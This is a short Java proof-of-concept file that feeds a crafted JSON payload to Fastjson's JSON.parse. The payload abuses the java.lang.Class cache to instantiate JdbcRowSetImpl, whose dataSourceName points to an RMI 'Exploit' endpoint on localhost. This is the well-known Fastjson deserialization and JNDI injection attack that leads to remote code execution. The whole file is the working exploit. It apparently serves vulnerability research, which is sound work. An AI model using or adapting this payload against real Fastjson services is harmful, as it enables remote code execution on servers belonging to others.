import com.alibaba.fastjson.JSON;

/**
 * @author <a href="http://blog.chenforcode.cn">PKUCoder</a>
 * @date 2022/3/19 9:37 下午
 * @description
 */
public class Poc {
    public static void main(String[] args) {
        String payload = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}}}";
        JSON.parse(payload);
    }
}
